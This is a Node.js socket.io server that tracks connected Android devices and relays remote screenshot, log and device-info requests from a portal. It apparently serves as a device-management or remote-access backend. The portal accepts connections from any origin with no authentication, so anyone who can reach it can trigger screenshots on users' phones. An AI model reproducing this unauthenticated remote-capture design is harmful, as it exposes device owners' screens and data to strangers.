import { Server } from "socket.io";
import chalk from "chalk";

import { db } from './db.js';

const serverPort = 4000;
const devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
const pendingScreenshots = new Map(); // Map<device_uuid, {portal_socket_id, timestamp}>
const pendingScreenshotResponses = new Map(); // Map<device_uuid, timeout>
const SCREENSHOT_TIMEOUT = 30000; // 30 seconds timeout

// Simple mutex for devices map synchronization
class Mutex {
    constructor() {
        this.locked = false;
        this.waiting = [];
    }

    async acquire() {
        return new Promise((resolve) => {
            if (!this.locked) {
                this.locked = true;
                resolve();
            } else {
                this.waiting.push(resolve);
            }
        });
    }

    release() {
        if (this.waiting.length > 0) {
            const next = this.waiting.shift();
            next();
        } else {
            this.locked = false;
        }
    }
}

const devicesMutex = new Mutex();

// Function to clean up expired screenshot requests
function cleanupExpiredScreenshotRequests() {
    const now = Date.now();
    const expiredDevices = [];

    for (const [deviceUuid, requestData] of pendingScreenshots.entries()) {
        if (now - requestData.timestamp > SCREENSHOT_TIMEOUT) {
            expiredDevices.push(deviceUuid);

            // Notify the portal that the request timed out
            const requestingSocket = portalIo.sockets.sockets.get(requestData.portal_socket_id);
            if (requestingSocket) {
                console.log(chalk.yellow(`Screenshot request timed out for device ${deviceUuid}, notifying portal ${requestData.portal_socket_id}`));
                requestingSocket.emit("screenshot_error", {
                    device_uuid: deviceUuid,
                    error: "Screenshot request timed out"
                });
            }
        }
    }

    // Remove expired requests
    expiredDevices.forEach(deviceUuid => {
        pendingScreenshots.delete(deviceUuid);
    });

    if (expiredDevices.length > 0) {
        console.log(chalk.blue(`Cleaned up ${expiredDevices.length} expired screenshot requests`));
    }
}

// Clean up expired requests every 10 seconds
setInterval(cleanupExpiredScreenshotRequests, 10000);


// Socket.io server
const io = new Server(serverPort, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

console.log(`Listening for android devices on http://0.0.0.0:${serverPort}/`)

// Socket io Connection for Android devices
const androidIo = io.of('/android');

androidIo.on("connection", async (socket) => {
    try {
        const dataStr = socket.handshake.query.info;
        if (!dataStr) {
            socket.disconnect();
            return;
        }
        const data = JSON.parse(dataStr);
        const deviceUuid = data.device_uuid;
        if (!deviceUuid) {
            socket.disconnect();
            return;
        }

        socket.deviceUuid = deviceUuid;

        // Synchronize access to devices map
        await devicesMutex.acquire();
        try {
            let device = devices.get(deviceUuid);
            if (device) {
                // Update existing device - ensure clean state
                device.info = data;
                device.socket = socket;
                // Clean up any stale screenshot requests for this device
                if (pendingScreenshots.has(deviceUuid)) {
                    console.log(chalk.yellow(`Cleaning up stale screenshot request for reconnected device ${deviceUuid}`));
                    pendingScreenshots.delete(deviceUuid);
                }
                if (!device.logs) {
                    device.logs = [];
                }
            } else {
                // New device
                device = {
                    info: data,
                    socket: socket,
                    logs: []
                };
                devices.set(deviceUuid, device);
            }
        } finally {
            devicesMutex.release();
        }

        // UPSERT device info in DB
        await db.run(
            'INSERT OR REPLACE INTO devices (device_uuid, brand, model, manufacturer, connected_at, last_seen) VALUES (?, ?, ?, ?, ?, ?)',
            deviceUuid, data.Brand, data.Model, data.Manufacturer, Date.now(), Date.now()
        ).catch(console.error);

        console.log(chalk.green(`[+] Android device Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))

        // Broadcast updated device list to portal with mutex protection
        await devicesMutex.acquire();
        try {
            const deviceList = Array.from(devices.values()).map((d) => ({
                ...d.info,
                ID: d.info.device_uuid
            })).slice(0, 20);

            portalIo.emit("devices", deviceList);
            console.log(chalk.blue(`[i] Status broadcast sent to portal(s) - ${deviceList.length} connected devices`));
        } finally {
            devicesMutex.release();
        }

        socket.on("disconnect", async (reason) => {
            // Capture deviceUuid before socket cleanup
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) {
                console.log(chalk.yellow(`[!] Device disconnected without UUID (reason: ${reason})`));
                return;
            }

            console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid}) - Reason: ${reason}`));

            // Clear any pending screenshot response timeouts
            if (pendingScreenshotResponses.has(deviceUuid)) {
                clearTimeout(pendingScreenshotResponses.get(deviceUuid));
                pendingScreenshotResponses.delete(deviceUuid);
            }

            try {
                // Synchronize access to devices map
                await devicesMutex.acquire();
                try {
                    const device = devices.get(deviceUuid);
                    if (device) {
                        device.socket = null;

                        // Clean up logs to prevent memory leaks (keep only recent 100 entries)
                        if (device.logs && device.logs.length > 100) {
                            device.logs = device.logs.slice(-100);
                        }
                    }

                    // Clean up any pending screenshot requests for this device
                    if (pendingScreenshots.has(deviceUuid)) {
                        const requestData = pendingScreenshots.get(deviceUuid);
                        const requestingPortalId = requestData.portal_socket_id;
                        console.log(chalk.yellow(`Cleaning up pending screenshot for device ${deviceUuid}, notifying portal ${requestingPortalId}`));

                        // Notify the portal that the device disconnected
                        const requestingSocket = portalIo.sockets.sockets.get(requestingPortalId);
                        if (requestingSocket) {
                            requestingSocket.emit("screenshot_error", {
                                device_uuid: deviceUuid,
                                error: "Device disconnected while taking screenshot"
                            });
                        }

                        pendingScreenshots.delete(deviceUuid);
                    }

                    // Update last_seen in DB with proper error handling
                    const dbResult = await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);
                    if (dbResult.changes === 0) {
                        console.log(chalk.yellow(`[!] No device found in DB for UUID: ${deviceUuid}`));
                    }

                    // Broadcast updated device list to portal with mutex protection
                    const deviceList = Array.from(devices.values()).map((d) => ({
                        ...d.info,
                        ID: d.info.device_uuid
                    })).slice(0, 20);

                    portalIo.emit("devices", deviceList);
                } finally {
                    devicesMutex.release();
                }
            } catch (error) {
                console.error('Error handling device disconnect:', error);
            }
        });
    } catch (error) {
        console.error('Error handling device connection:', error);
        socket.disconnect();
    }
});

// Socket io Connection for Portal (frontend server)
const portalIo = io.of('/portal');

portalIo.on("connection", async (socket) => {
    console.log(chalk.greenBright(`[+] Portal Connected (${socket.id})`))

    try {
        await devicesMutex.acquire();
        try {
            const deviceList = Array.from(devices.values()).map((d) => ({
                ...d.info,
                ID: d.info.device_uuid
            })).slice(0, 20);
            socket.emit("devices", deviceList);
        } finally {
            devicesMutex.release();
        }
    } catch (error) {
        console.error('Error sending initial device list to portal:', error);
        socket.emit("devices", []);
    }

    socket.on("get_device_logs", async (id) => {
        if (!id) {
            socket.emit("device_logs", []);
            return;
        }

        try {
            await devicesMutex.acquire();
            try {
                const device = devices.get(id);
                if (device && device.logs) {
                    socket.emit("device_logs", device.logs.map(l => l.log));
                } else {
                    socket.emit("device_logs", []);
                }
            } finally {
                devicesMutex.release();
            }
        } catch (error) {
            console.error('Error getting device logs:', error);
            socket.emit("device_logs", []);
        }
    });

    socket.on("screenshot_req", async (deviceId) => {
        deviceId = (typeof deviceId === 'string' ? deviceId.trim() : deviceId);
        if (!deviceId || deviceId === 'None') {
            console.log(chalk.red(`Screenshot request with invalid/None deviceId`));
            socket.emit("screenshot_error", { device_uuid: deviceId, error: "Invalid device ID" });
            return;
        }

        console.log(`Relaying screenshot request to device: ${deviceId} from portal: ${socket.id}`);
        console.log(`Current devices map keys: ${Array.from(devices.keys()).join(', ')}`);

        try {
            await devicesMutex.acquire();
            try {
                let device = devices.get(deviceId);

                if (device && !device.socket) {
                    console.log(chalk.yellow(`Device ${deviceId} is in map but socket is null. Checking for fallback available socket`));
                    const fallback = Array.from(devices.values()).find((d) => d.info && d.info.device_uuid === deviceId && d.socket);
                    if (fallback) {
                        device = fallback;
                        devices.set(deviceId, fallback);
                        console.log(chalk.green(`Fallback socket found for ${deviceId}, reseting device socket reference`));
                    }
                }

                if (device && device.socket) {
                    // Check if there's already a pending request for this device
                    const existingRequest = pendingScreenshots.get(deviceId);

                    if (existingRequest) {
                        // Check if the request has timed out
                        const now = Date.now();
                        if (now - existingRequest.timestamp > SCREENSHOT_TIMEOUT) {
                            console.log(chalk.yellow(`Screenshot request timed out for device ${deviceId}, allowing new request from ${socket.id}`));
                            pendingScreenshots.delete(deviceId);
                        } else {
                            // If another portal already requested, send error to current portal
                            console.log(chalk.yellow(`Screenshot already pending for device ${deviceId}, rejecting duplicate request from ${socket.id}`));
                            socket.emit("screenshot_error", {
                                device_uuid: deviceId,
                                error: "Screenshot already in progress for this device"
                            });
                            return;
                        }
                    }

                    // Store the mapping between device UUID and portal socket ID with timestamp
                    pendingScreenshots.set(deviceId, {
                        portal_socket_id: socket.id,
                        timestamp: Date.now()
                    });
                    device.socket.emit("screenshot");
                    console.log(chalk.green(`Screenshot request sent to device ${deviceId} for portal ${socket.id}`));

                    // Set timeout for response - if no response within 10 seconds, mark as failed and clear mappings
                    pendingScreenshotResponses.set(deviceId, setTimeout(async () => {
                        console.log(chalk.red(`Screenshot response timeout for device ${deviceId}, clearing pending state and notifying portal(s)`));

                        const requestData = pendingScreenshots.get(deviceId);
                        if (requestData && requestData.portal_socket_id) {
                            const requestingSocket = portalIo.sockets.sockets.get(requestData.portal_socket_id);
                            if (requestingSocket) {
                                requestingSocket.emit("screenshot_error", { device_uuid: deviceId, error: "Screenshot response timed out" });
                            }
                        } else {
                            portalIo.emit("screenshot_error", { device_uuid: deviceId, error: "Screenshot response timed out" });
                        }

                        pendingScreenshots.delete(deviceId);
                        pendingScreenshotResponses.delete(deviceId);

                        // Keep server alive and avoid forcing process restart
                    }, 10000));
                } else {
                    console.log(chalk.red(`Device ${deviceId} not found, socket disconnected, or not connected`));
                    socket.emit("screenshot_error", { device_uuid: deviceId, error: "Device not available" });
                }
            } finally {
                devicesMutex.release();
            }
        } catch (error) {
            console.error('Error handling screenshot request:', error);
            socket.emit("screenshot_error", { device_uuid: deviceId, error: "Internal server error" });
        }
    });

    socket.on("get_device_info", async (deviceId) => {
        if (!deviceId) {
            socket.emit("device_info_error", { error: "Invalid device ID" });
            return;
        }

        try {
            await devicesMutex.acquire();
            try {
                const device = devices.get(deviceId);
                if (device) {
                    socket.emit("device_info", device.info);
                } else {
                    socket.emit("device_info_error", { error: "Device not found" });
                }
            } finally {
                devicesMutex.release();
            }
        } catch (error) {
            console.error('Error getting device info:', error);
            socket.emit("device_info_error", { error: "Internal server error" });
        }
    });

    socket.on("validate_config", () => {
        console.log(chalk.cyan(`[i] Config validation request received via WS from portal ${socket.id}`));
        
        try {
            // Broadcast validation event to all connected Android devices
            androidIo.emit("config_validation_request", { timestamp: Date.now() });
            // Also notify portal dashboards if desired
            portalIo.emit("config_validation_request", { timestamp: Date.now() });
            
            // Optionally, confirm to the requesting portal
            socket.emit("validate_config_response", { success: true, message: 'Validation request sent' });
        } catch (error) {
            console.error('Config validation error:', error);
            socket.emit("validate_config_response", { success: false, error: error.message });
        }
    });

    socket.on("disconnect", () => {
        console.log(chalk.red(`[x] Portal Disconnected (${socket.id})`))

        // Clean up any pending screenshot requests for this portal
        for (const [deviceId, requestData] of pendingScreenshots.entries()) {
            if (requestData && requestData.portal_socket_id === socket.id) {
                pendingScreenshots.delete(deviceId);
                console.log(chalk.yellow(`Cleared pending screenshot request for device ${deviceId} due portal disconnect ${socket.id}`));
            }
        }
    });
});

console.log(chalk.blue(`[i] Server running on port ${serverPort}`));
console.log(chalk.blue(`[i] Android namespace: /android`));
console.log(chalk.blue(`[i] Portal namespace: /portal`));
